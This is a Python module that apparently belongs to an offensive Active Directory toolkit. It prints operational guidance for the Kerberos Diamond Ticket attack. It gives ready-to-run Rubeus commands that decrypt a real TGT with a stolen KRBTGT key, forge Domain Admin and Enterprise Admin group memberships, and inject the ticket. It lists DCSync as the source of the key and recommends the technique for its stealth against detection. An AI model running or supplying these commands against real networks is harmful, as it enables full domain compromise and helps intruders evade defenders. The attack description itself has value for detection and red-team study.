"""
Diamond Ticket Guidance — The stealthiest ticket attack.

Diamond Tickets modify a legitimately-issued TGT rather than
forging one from scratch:

    1. Request a REAL TGT from the KDC (creates valid AS-REP log)
    2. Decrypt it with the KRBTGT key
    3. Modify the PAC (change group memberships, user ID)
    4. Re-encrypt it with the KRBTGT key

Result: A ticket with a legitimate issuance event in the KDC logs,
making it extremely hard to detect compared to Golden Tickets.
"""


class DiamondTicketGuidance:
    """Print Diamond Ticket operational guidance and Rubeus commands."""

    def __init__(self, domain: str, dc_ip: str):
        self.domain = domain
        self.dc_ip = dc_ip

    def print_guidance(self, krbtgt_aes256: str = ""):
        """Print full Diamond Ticket concept, comparison, and commands."""
        print(f"\n{'=' * 60}")
        print("DIAMOND TICKET (STEALTHY GOLDEN TICKET ALTERNATIVE)")
        print(f"{'=' * 60}")

        print(f"""
[*] Diamond Ticket Concept:

    1. Authenticate normally     → AS-REQ / AS-REP logged ✓
    2. Receive legitimate TGT    → Real ticket from KDC ✓
    3. Decrypt TGT with KRBTGT   → We have the key ✓
    4. Modify PAC (groups/RID)   → Add DA, EA, etc. ✓
    5. Re-encrypt with KRBTGT    → Valid encryption ✓
    6. Use modified ticket        → KDC trusts it completely

[*] Why Diamond > Golden:

    Golden Ticket:
    ├── No AS-REQ in logs (anomaly)
    ├── Unusual ticket lifetime (10 years)
    ├── May have invalid ticket fields
    └── Detection: "TGT used without prior AS-REQ"

    Diamond Ticket:
    ├── Real AS-REQ/AS-REP in logs ✓
    ├── Normal ticket lifetime ✓
    ├── All ticket fields legitimate ✓
    └── Only the PAC is modified (very hard to detect)

[*] Rubeus Diamond Ticket:

    # Request real TGT, decrypt with KRBTGT AES, modify PAC, re-encrypt
    Rubeus.exe diamond /krbkey:{krbtgt_aes256 or '<KRBTGT_AES256>'} \\
        /user:lowprivuser /password:Password123! \\
        /enctype:aes /domain:{self.domain} \\
        /dc:{self.dc_ip} /ptt

    # Specify target groups
    Rubeus.exe diamond /krbkey:{krbtgt_aes256 or '<KRBTGT_AES256>'} \\
        /user:lowprivuser /password:Password123! \\
        /enctype:aes /domain:{self.domain} \\
        /dc:{self.dc_ip} /groups:512,519 /ptt

[*] Requirements:
    - KRBTGT AES256 key (from DCSync)
    - Valid low-privilege credentials (for the initial real TGT request)
    - Rubeus (primary tool for Diamond Tickets)

[*] OPSEC Note: This is currently the hardest ticket attack to detect.
    Use this over Golden Tickets when stealth is critical.
""")